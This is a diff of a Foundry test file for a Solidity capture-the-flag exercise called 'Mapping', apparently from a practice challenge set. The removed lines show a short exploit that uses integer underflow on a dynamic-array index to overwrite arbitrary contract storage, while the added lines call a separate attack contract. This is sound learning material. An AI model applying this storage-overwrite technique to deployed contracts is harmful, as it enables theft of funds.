@@ -1,35 +1,30 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.2;
-pragma experimental ABIEncoderV2;
+pragma solidity ^0.8.0;
 
 import { Test } from "forge-std/Test.sol";
+import { MappingChallengeFactory } from "../src/challenges/13_Mapping/MappingChallengeFactory.sol";
 
 interface IMappingChallenge {
     function isComplete() external returns (bool);
-
-    function set(uint256 key, uint256 value) external;
 }
 
-interface IMappingChallengeFactory {
-    function createChallenge() external returns (address);
+interface IMappingAttack {
+    function attack(address target) external;
 }
 
 contract MappingTest is Test {
     IMappingChallenge public challenge;
 
     function setUp() public {
-        address factoryAddress = deployCode("MappingChallengeFactory.sol:MappingChallengeFactory");
-        address challengeAddress = IMappingChallengeFactory(factoryAddress).createChallenge();
+        MappingChallengeFactory factory = new MappingChallengeFactory();
+        address challengeAddress = factory.createChallenge();
         challenge = IMappingChallenge(challengeAddress);
     }
 
     function test() public {
-        // Calculating index of the slot which stores first element of map array
-        // (slot with index 1 stores map array header)
-        uint256 slotIndex = uint256(keccak256(abi.encode(1)));
-        // Underflow
-        uint256 index = 0 - slotIndex;
-        challenge.set(index, 1);
+        address attackerAddress = deployCode("MappingAttack.sol:MappingAttack");
+        IMappingAttack attacker = IMappingAttack(attackerAddress);
+        attacker.attack(address(challenge));
 
         assertTrue(challenge.isComplete());
     }
